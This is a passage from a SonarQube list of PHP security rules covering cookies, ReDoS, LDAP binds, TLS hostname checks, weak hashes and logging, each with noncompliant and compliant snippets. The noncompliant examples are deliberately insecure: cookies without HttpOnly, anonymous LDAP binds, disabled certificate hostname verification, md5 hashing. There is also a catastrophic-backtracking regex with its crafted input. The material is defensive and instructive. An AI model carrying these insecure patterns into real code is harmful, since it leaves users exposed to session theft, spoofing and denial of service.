  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/hDdGBQ">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S3332">
              php:S3332
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<h2>Why is this an issue?</h2>
<p>Cookies without fixed lifetimes or expiration dates are known as non-persistent, or "session" cookies, meaning they last only as long as the
browser session, and poof away when the browser closes. Cookies with expiration dates, "persistent" cookies, are stored/persisted until those
dates.</p>
<p>Non-persistent cookies should be used for the management of logged-in sessions on web sites. To make a cookie non-persistent, simply omit the
<code>expires</code> attribute.</p>
<p>This rule raises an issue when <code>expires</code> is set for a session cookie, either programmatically or via configuration, such as
<code>session.cookie_lifetime</code>.</p>
<h2>Resources</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)">Top 10 2017 Category A7 - Cross-Site Scripting
  (XSS)</a> </li>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#expire-and-max-age-attributes">OWASP, Session
  Management Cheat Sheet</a> - Expire and Max-Age Attributes </li>
  <li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#COOKIE_PERSISTENT">COOKIE_PERSISTENT</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S3330">
              php:S3330
            </a>
          </td>
          <td>
            <details>
              <p>When a cookie is configured with the <code>HttpOnly</code> attribute set to <em>true</em>, the browser guaranties that no client-side script will
be able to read it. In most cases, when a cookie is created, the default value of <code>HttpOnly</code> is <em>false</em> and it’s up to the developer
to decide whether or not the content of the cookie can be read by the client-side script. As a majority of Cross-Site Scripting (XSS) attacks target
the theft of session-cookies, the <code>HttpOnly</code> attribute can help to reduce their impact as it won’t be possible to exploit the XSS
vulnerability to steal session-cookies.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the cookie is sensitive, used to authenticate the user, for instance a <em>session-cookie</em> </li>
  <li> the <code>HttpOnly</code> attribute offer an additional protection (not the case for an <em>XSRF-TOKEN cookie</em> / CSRF token for example)
  </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> By default the <code>HttpOnly</code> flag should be set to <em>true</em> for most of the cookies and it’s mandatory for session /
  sensitive-security cookies. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>In <em>php.ini</em> you can specify the flags for the session cookie which is security-sensitive:</p>
<pre>
session.cookie_httponly = 0;  // Sensitive: this sensitive session cookie is created with the httponly flag set to false and so it can be stolen easily in case of XSS vulnerability
</pre>
<p>Same thing in PHP code:</p>
<pre>
session_set_cookie_params($lifetime, $path, $domain, true, false);  // Sensitive: this sensitive session cookie is created with the httponly flag (the fifth argument) set to false and so it can be stolen easily in case of XSS vulnerability
</pre>
<p>If you create a custom security-sensitive cookie in your PHP code:</p>
<pre>
$value = "sensitive data";
setcookie($name, $value, $expire, $path, $domain, true, false); // Sensitive: this sensitive cookie is created with the httponly flag (the seventh argument) set to false  and so it can be stolen easily in case of XSS vulnerability
</pre>
<p>By default <a href="https://www.php.net/manual/en/function.setcookie.php"><code>setcookie</code></a> and <a
href="https://www.php.net/manual/en/function.setrawcookie.php"><code>setrawcookie</code></a> functions set <code>httpOnly</code> flag to
<em>false</em> (the seventh argument) and so cookies can be stolen easily in case of XSS vulnerability:</p>
<pre>
$value = "sensitive data";
setcookie($name, $value, $expire, $path, $domain, true); // Sensitive: a sensitive cookie is created with the httponly flag  (the seventh argument) not defined (by default set to false)
setrawcookie($name, $value, $expire, $path, $domain, true); // Sensitive: a sensitive cookie is created with the httponly flag (the seventh argument) not defined  (by default set to false)
</pre>
<h2>Compliant Solution</h2>
<pre>
session.cookie_httponly = 1; // Compliant: the sensitive cookie is protected against theft thanks (cookie_httponly=1)
</pre>
<pre>
session_set_cookie_params($lifetime, $path, $domain, true, true); // Compliant: the sensitive cookie is protected against theft thanks to the fifth argument set to true (HttpOnly=true)
</pre>
<pre>
$value = "sensitive data";
setcookie($name, $value, $expire, $path, $domain, true, true); // Compliant: the sensitive cookie is protected against theft thanks to the seventh argument set to true (HttpOnly=true)
setrawcookie($name, $value, $expire, $path, $domain, true, true); // Compliant: the sensitive cookie is protected against theft thanks to the seventh argument set to true (HttpOnly=true)
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> <a href="https://owasp.org/www-community/HttpOnly">OWASP HttpOnly</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)">Top 10 2017 Category A7 - Cross-Site Scripting
  (XSS)</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/1004">CWE-1004 - Sensitive Cookie Without 'HttpOnly' Flag</a> </li>
  <li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#HTTPONLY_COOKIE">HTTPONLY_COOKIE</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S4784">
              php:S4784
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated; use <a href='/organizations/sopra-steria/rules?open=phpsecurity%3AS2631&rule_key=phpsecurity%3AS2631'>S2631</a> instead.</p>
<p>Using regular expressions is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-16021">CVE-2017-16021</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13863">CVE-2018-13863</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-8926">CVE-2018-8926</a> </li>
</ul>
<p>Evaluating regular expressions against input strings is potentially an extremely CPU-intensive task. Specially crafted regular expressions such as
<code>/(a+)+s/</code> will take several seconds to evaluate the input string <code>aaaaaaaaaaaaaaaaaaaaaaaaaaaaaabs</code>. The problem is that with
every additional <code>a</code> character added to the input, the time required to evaluate the regex doubles. However, the equivalent regular
expression, <code>a+s</code> (without grouping) is efficiently evaluated in milliseconds and scales linearly with the input size.</p>
<p>Evaluating such regular expressions opens the door to <a
href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS">Regular expression Denial of Service (ReDoS)</a> attacks.
In the context of a web application, attackers can force the web server to spend all of its resources evaluating regular expressions thereby making
the service inaccessible to genuine users.</p>
<p>This rule flags any execution of a hardcoded regular expression which has at least 3 characters and contains at at least two instances of any of
the following characters <code>*+{</code>.</p>
<p>Example: <code>(a+)*</code></p>
<p>The following functions are detected as executing regular expressions:</p>
<ul>
  <li> <a href="http://php.net/manual/en/book.pcre.php">PCRE</a>: Perl style regular expressions: <a
  href="http://php.net/manual/en/function.preg-filter.php">preg_filter</a>, <a href="http://php.net/manual/en/function.preg-grep.php">preg_grep</a>,
  <a href="http://php.net/manual/en/function.preg-match-all.php">preg_match_all</a>, <a
  href="http://php.net/manual/en/function.preg-match.php">preg_match</a>, <a
  href="http://php.net/manual/en/function.preg-replace-callback.php">preg_replace_callback</a>, <a
  href="http://php.net/manual/en/function.preg-replace.php">preg_replace</a>, <a
  href="http://php.net/manual/en/function.preg-split.php">preg_split</a> </li>
  <li> <a href="http://php.net/manual/en/book.regex.php">POSIX extended</a>, which are deprecated: <a
  href="http://php.net/manual/en/function.ereg-replace.php">ereg_replace</a>, <a href="http://php.net/manual/en/function.ereg.php">ereg</a>, <a
  href="http://php.net/manual/en/function.eregi-replace.php">eregi_replace</a>, <a href="http://php.net/manual/en/function.eregi.php">eregi</a>, <a
  href="http://php.net/manual/en/function.split.php">split</a>, <a href="http://php.net/manual/en/function.spliti.php">spliti</a>. </li>
  <li> <a href="http://php.net/manual/en/function.fnmatch.php">fnmatch</a> </li>
  <li> Any of the multibyte string regular expressions: <a href="http://php.net/manual/en/function.mb-eregi-replace.php">mb_eregi_replace</a>, <a
  href="http://php.net/manual/en/function.mb-ereg-match.php">mb_ereg_match</a>, <a
  href="http://php.net/manual/en/function.mb-ereg-replace-callback.php">mb_ereg_replace_callback</a>, <a
  href="http://php.net/manual/en/function.mb-ereg-replace.php">mb_ereg_replace</a>, <a
  href="http://php.net/manual/en/function.mb-ereg-search-init.php">mb_ereg_search_init</a>, <a
  href="http://php.net/manual/en/function.mb-ereg-search-pos.php">mb_ereg_search_pos</a>, <a
  href="http://php.net/manual/en/function.mb-ereg-search-regs.php">mb_ereg_search_regs</a>, <a
  href="http://php.net/manual/en/function.mb-ereg-search.php">mb_ereg_search</a>, <a href="http://php.net/manual/en/function.mb-ereg.php">mb_ereg</a>,
  <a href="http://php.net/manual/en/function.mb-eregi-replace.php">mb_eregi_replace</a>, <a
  href="http://php.net/manual/en/function.mb-eregi.php">mb_eregi</a> </li>
</ul>
<p>Note that <code>ereg*</code> functions have been removed in PHP 7 and <strong>PHP 5 end of life date is the 1st of January 2019. Using PHP 5 is
dangerous as there will be no security fix</strong>.</p>
<p>This rule’s goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the executed regular expression is sensitive and a user can provide a string which will be analyzed by this regular expression. </li>
  <li> your regular expression engine performance decrease with specially crafted inputs and regular expressions. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Do not set the constant <code>pcre.backtrack_limit</code> to a high value as it will increase the resource consumption of PCRE functions.</p>
<p>Check the error codes of PCRE functions via <code>preg_last_error</code>.</p>
<p>Check whether your regular expression engine (the algorithm executing your regular expression) has any known vulnerabilities. Search for
vulnerability reports mentioning the one engine you’re are using. Do not run vulnerable regular expressions on user input.</p>
<p>Use if possible a library which is not vulnerable to Redos Attacks such as <a href="https://github.com/google/re2">Google Re2</a>.</p>
<p>Remember also that a ReDos attack is possible if a user-provided regular expression is executed. This rule won’t detect this kind of injection.</p>
<p>Avoid executing a user input string as a regular expression or use at least <code>preg_quote</code> to escape regular expression characters.</p>
<h2>Exceptions</h2>
<p>An issue will be created for the functions <code>mb_ereg_search_pos</code>, <code>mb_ereg_search_regs</code> and <code>mb_ereg_search</code> if and
only if at least the first argument, i.e. the $pattern, is provided.</p>
<p>The current implementation does not follow variables. It will only detect regular expressions hard-coded directly in the function call.</p>
<pre>
$pattern = "/(a+)+/";
$result = eregi($pattern, $input);  // No issue will be raised even if it is Sensitive
</pre>
<p>Some corner-case regular expressions will not raise an issue even though they might be vulnerable. For example: <code>(a|aa)+</code>,
<code>(a|a?)+</code>.</p>
<p>It is a good idea to test your regular expression if it has the same pattern on both side of a "<code>|</code>".</p>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS">CWE-624 - Executable Regular Expression
  Error</a> </li>
  <li> OWASP Regular expression Denial of Service - ReDoS </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S3331">
              php:S3331
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>A cookie’s domain specifies which websites should be able to read it. Left blank, browsers are supposed to only send the cookie to sites that
exactly match the sending domain. For example, if a cookie was set by <em>lovely.dream.com</em>, it should only be readable by that domain, and not by
<em>nightmare.com</em> or even <em>strange.dream.com</em>. If you want to allow sub-domain access for a cookie, you can specify it by adding a dot in
front of the cookie’s domain, like so: <em>.dream.com</em>. But cookie domains should always use at least two levels.</p>
<p>Cookie domains can be set either programmatically or via configuration. This rule raises an issue when any cookie domain is set with a single
level, as in <em>.com</em>.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the <code>domain</code> attribute has only one level as domain naming. </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> You should check the <code>domain</code> attribute has been set and its value has more than one level of domain nanimg, like:
  <em>sonarsource.com</em> </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
setcookie("TestCookie", $value, time()+3600, "/~path/", ".com", 1); // Noncompliant
session_set_cookie_params(3600, "/~path/", ".com"); // Noncompliant

// inside php.ini
session.cookie_domain=".com"; // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
setcookie("TestCookie", $value, time()+3600, "/~path/", ".myDomain.com", 1);
session_set_cookie_params(3600, "/~path/", ".myDomain.com");

// inside php.ini
session.cookie_domain=".myDomain.com";
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S3338">
              php:S3338
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<h2>Why is this an issue?</h2>
<p><code>file_uploads</code> is an on-by-default PHP configuration that allows files to be uploaded to your site. Since accepting <span>candy</span>
files from strangers is inherently dangerous, this feature should be disabled unless it is absolutely necessary for your site.</p>
<p>This rule raises an issue when <code>file_uploads</code> is not explicitly disabled.</p>
<h3>Noncompliant code example</h3>
<pre>
; php.ini
file_uploads=1  ; Noncompliant
</pre>
<h3>Compliant solution</h3>
<pre>
; php.ini
file_uploads=0
</pre>
<h2>Resources</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/434">CWE-434 - Unrestricted Upload of File with Dangerous Type</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S2255">
              php:S2255
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Using cookies is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11639">CVE-2018-11639</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6537">CVE-2016-6537</a> </li>
</ul>
<p>Attackers can use widely-available tools to read cookies. Any sensitive information they may contain will be exposed.</p>
<p>This rule flags code that writes cookies.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> sensitive information is stored inside the cookie. </li>
</ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Cookies should only be used to manage the user session. The best practice is to keep all user-related information server-side and link them to the
user session, never sending them to the client. In a very few corner cases, cookies can be used for non-sensitive information that need to live longer
than the user session.</p>
<p>Do not try to encode sensitive information in a non human-readable format before writing them in a cookie. The encoding can be reverted and the
original information will be exposed.</p>
<p>Using cookies only for session IDs doesn’t make them secure. Follow <a
href="https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#cookies">OWASP best practices</a> when you configure your
cookies.</p>
<p>As a side note, every information read from a cookie should be <a
href="https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet">Sanitized</a>.</p>
<h2>Sensitive Code Example</h2>
<pre>
$value = "1234 1234 1234 1234";

// Review this cookie as it seems to send sensitive information (credit card number).
setcookie("CreditCardNumber", $value, $expire, $path, $domain, true, true); // Sensitive
setrawcookie("CreditCardNumber", $value, $expire, $path, $domain, true, true); // Sensitive
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/312">CWE-312 - Cleartext Storage of Sensitive Information</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/315">CWE-315 - Cleartext Storage of Sensitive Information in a Cookie</a> </li>
  <li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#COOKIE_USAGE">COOKIE_USAGE</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S4433">
              php:S4433
            </a>
          </td>
          <td>
            <details>
              <p>Lightweight Directory Access Protocol (LDAP) servers provide two main authentication methods: the <em>SASL</em> and <em>Simple</em> ones. The
<em>Simple Authentication</em> method also breaks down into three different mechanisms:</p>
<ul>
  <li> <em>Anonymous</em> Authentication </li>
  <li> <em>Unauthenticated</em> Authentication </li>
  <li> <em>Name/Password</em> Authentication </li>
</ul>
<p>A server that accepts either the <em>Anonymous</em> or <em>Unauthenticated</em> mechanisms will accept connections from clients not providing
credentials.</p>
<h2>Why is this an issue?</h2>
<p>When configured to accept the Anonymous or Unauthenticated authentication mechanism, an LDAP server will accept connections from clients that do
not provide a password or other authentication credentials. Such users will be able to read or modify part or all of the data contained in the hosted
directory.</p>
<h3>What is the potential impact?</h3>
<p>An attacker exploiting unauthenticated access to an LDAP server can access the data that is stored in the corresponding directory. The impact
varies depending on the permission obtained on the directory and the type of data it stores.</p>
<h4>Authentication bypass</h4>
<p>If attackers get write access to the directory, they will be able to alter most of the data it stores. This might include sensitive technical data
such as user passwords or asset configurations. Such an attack can typically lead to an authentication bypass on applications and systems that use the
affected directory as an identity provider.</p>
<p>In such a case, all users configured in the directory might see their identity and privileges taken over.</p>
<h4>Sensitive information leak</h4>
<p>If attackers get read-only access to the directory, they will be able to read the data it stores. That data might include security-sensitive pieces
of information.</p>
<p>Typically, attackers might get access to user account lists that they can use in further intrusion steps. For example, they could use such lists to
perform password spraying, or related attacks, on all systems that rely on the affected directory as an identity provider.</p>
<p>If the directory contains some Personally Identifiable Information, an attacker accessing it might represent a violation of regulatory requirements
in some countries. For example, this kind of security event would go against the European GDPR law.</p>
<h2>How to fix it</h2>
<h3>Code examples</h3>
<p>The following code indicates an anonymous LDAP authentication vulnerability because it binds to a remote server using an Anonymous Simple
authentication mechanism.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
$ldapconn = ldap_connect("ldap.example.com");

if ($ldapconn) {
    $ldapbind = ldap_bind($ldapconn); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
$ldaprdn  = 'uname';
$ldappass = 'password';

$ldapconn = ldap_connect("ldap.example.com");

if ($ldapconn) {
    $ldapbind = ldap_bind($ldapconn, $ldaprdn, $ldappass); // Compliant
}
</pre>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://datatracker.ietf.org/doc/html/rfc4513#section-5">RFC 4513 - Lightweight Directory Access Protocol (LDAP): Authentication
  Methods and Security Mechanisms</a> - Bind operations </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication">Top 10 2017 Category A2 - Broken Authentication</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/521">CWE-521 - Weak Password Requirements</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S5527">
              php:S5527
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability allows attackers to impersonate a trusted host.</p>
<h2>Why is this an issue?</h2>
<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them. In this
process, the role of hostname validation, combined with certificate validation, is to ensure that a system is indeed the one it claims to be, adding
an extra layer of trust and security.</p>
<p>When hostname validation is disabled, the client skips this critical check. This creates an opportunity for attackers to pose as a trusted entity
and intercept, manipulate, or steal the data being transmitted.</p>
<p>To do so, an attacker would obtain a valid certificate authenticating <code>example.com</code>, serve it using a different hostname, and the
application code would still accept it.</p>
<h3>What is the potential impact?</h3>
<p>Establishing trust in a secure way is a non-trivial task. When you disable hostname validation, you are removing a key mechanism designed to build
this trust in internet communication, opening your system up to a number of potential threats.</p>
<h4>Identity spoofing</h4>
<p>If a system does not validate hostnames, it cannot confirm the identity of the other party involved in the communication. An attacker can exploit
this by creating a fake server and masquerading it as a legitimate one. For example, they might set up a server that looks like your bank’s server,
tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect any data
your system sends to them, potentially leading to significant data breaches.</p>
<h2>How to fix it in cURL</h2>
<h3>Code examples</h3>
<p>The following code contains examples of disabled hostname validation.</p>
<p>The hostname validation gets disabled by setting <code>CURLOPT_SSL_VERIFYHOST</code> to <code>0 or false</code>. To enable validation set the value
to <code>2 or true</code> or do not set <code>CURLOPT_SSL_VERIFYHOST</code> at all to use the secure default value.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, 'https://example.com/');
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);  // Noncompliant
curl_exec($curl);
curl_close($curl);
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, 'https://example.com/');
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 2);
curl_exec($curl);
curl_close($curl);
</pre>
<h3>How does this work?</h3>
<p>To fix the vulnerability of disabled hostname validation, it is strongly recommended to first re-enable the default validation and fix the root
cause: the validity of the certificate.</p>
<h4>Use valid certificates</h4>
<p>If a hostname validation failure prevents connecting to the target server, keep in mind that <strong>one system’s code should not work around
another system’s problems</strong>, as this creates unnecessary dependencies and can lead to reliability issues.</p>
<p>Therefore, the first solution is to change the remote host’s certificate to match its identity. If the remote host is not under your control,
consider replicating its service to a server whose certificate you can change yourself.</p>
<p>In case the contacted host is located on a development machine, and if there is no other choice, try following this solution:</p>
<ul>
  <li> Create a self-signed certificate for that machine. </li>
  <li> Add this self-signed certificate to the system’s trust store. </li>
  <li> If the hostname is not <code>localhost</code>, add the hostname in the <code>/etc/hosts</code> file. </li>
</ul>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">Top 10 2021 Category A7 - Identification and
  Authentication Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements">Mobile AppSec
  Verification Standard - Network Communication Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication">Mobile Top 10 2016 Category M3 - Insecure
  Communication</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/297">CWE-297 - Improper Validation of Certificate with Host Mismatch</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S4790">
              php:S4790
            </a>
          </td>
          <td>
            <details>
              <p>Cryptographic hash algorithms such as <code>MD2</code>, <code>MD4</code>, <code>MD5</code>, <code>MD6</code>, <code>HAVAL-128</code>,
<code>HMAC-MD5</code>, <code>DSA</code> (which uses <code>SHA-1</code>), <code>RIPEMD</code>, <code>RIPEMD-128</code>, <code>RIPEMD-160</code>,
<code>HMACRIPEMD160</code> and <code>SHA-1</code> are no longer considered secure, because it is possible to have <code>collisions</code> (little
computational effort is enough to find two or more different inputs that produce the same hash).</p>
<h2>Ask Yourself Whether</h2>
<p>The hashed value is used in a security context like:</p>
<ul>
  <li> User-password storage. </li>
  <li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc …​). </li>
  <li> To compute some message integrity. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> are recommended, and for password hashing, it’s even
better to use algorithms that do not compute too "quickly", like <code>bcrypt</code>, <code>scrypt</code>, <code>argon2</code> or <code>pbkdf2</code>
because it slows down <code>brute force attacks</code>.</p>
<h2>Sensitive Code Example</h2>
<pre>
$hash = md5($data); // Sensitive
$hash = sha1($data);   // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
// for a password
$hash = password_hash($password, PASSWORD_BCRYPT); // Compliant

// other context
$hash = hash("sha512", $data);
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements">Mobile AppSec
  Verification Standard - Cryptography Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography">Mobile Top 10 2016 Category M5 -
  Insufficient Cryptography</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/1240">CWE-1240 - Use of a Risky Cryptographic Primitive</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S4792">
              php:S4792
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Configuring loggers is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0285">CVE-2018-0285</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-1127">CVE-2000-1127</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-15113">CVE-2017-15113</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5742">CVE-2015-5742</a> </li>
</ul>
<p>Logs are useful before, during and after a security incident.</p>
<ul>
  <li> Attackers will most of the time start their nefarious work by probing the system for vulnerabilities. Monitoring this activity and stopping it
  is the first step to prevent an attack from ever happening. </li>
  <li> In case of a successful attack, logs should contain enough information to understand what damage an attacker may have inflicted. </li>
</ul>
<p>Logs are also a target for attackers because they might contain sensitive information. Configuring loggers has an impact on the type of information
logged and how they are logged.</p>
<p>This rule flags for review code that initiates loggers configuration. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> unauthorized users might have access to the logs, either because they are stored in an insecure location or because the application gives
  access to them. </li>
  <li> the logs contain sensitive information on a production server. This can happen when the logger is in debug mode. </li>
  <li> the log can grow without limit. This can happen when additional information is written into logs every time a user performs an action and the
  user can perform the action as many times as he/she wants. </li>
  <li> the logs do not contain enough information to understand the damage an attacker might have inflicted. The loggers mode (info, warn, error)
  might filter out important information. They might not print contextual information like the precise time of events or the server hostname. </li>
  <li> the logs are only stored locally instead of being backuped or replicated. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Check that your production deployment doesn’t have its loggers in "debug" mode as it might write sensitive information in logs. </li>
  <li> Production logs should be stored in a secure location which is only accessible to system administrators. </li>
  <li> Configure the loggers to display all warnings, info and error messages. Write relevant information such as the precise time of events and the
  hostname. </li>
  <li> Choose log format which is easy to parse and process automatically. It is important to process logs rapidly in case of an attack so that the
  impact is known and limited. </li>
  <li> Check that the permissions of the log files are correct. If you index the logs in some other service, make sure that the transfer and the
  service are secure too. </li>
  <li> Add limits to the size of the logs and make sure that no user can fill the disk with logs. This can happen even when the user does not control
  the logged information. An attacker could just repeat a logged action many times. </li>
</ul>
<p>Remember that configuring loggers properly doesn’t make them bullet-proof. Here is a list of recommendations explaining on how to use your
logs:</p>
<ul>
  <li> Don’t log any sensitive information. This obviously includes passwords and credit card numbers but also any personal information such as user
  names, locations, etc…​ Usually any information which is protected by law is good candidate for removal. </li>
  <li> Sanitize all user inputs before writing them in the logs. This includes checking its size, content, encoding, syntax, etc…​ As for any user
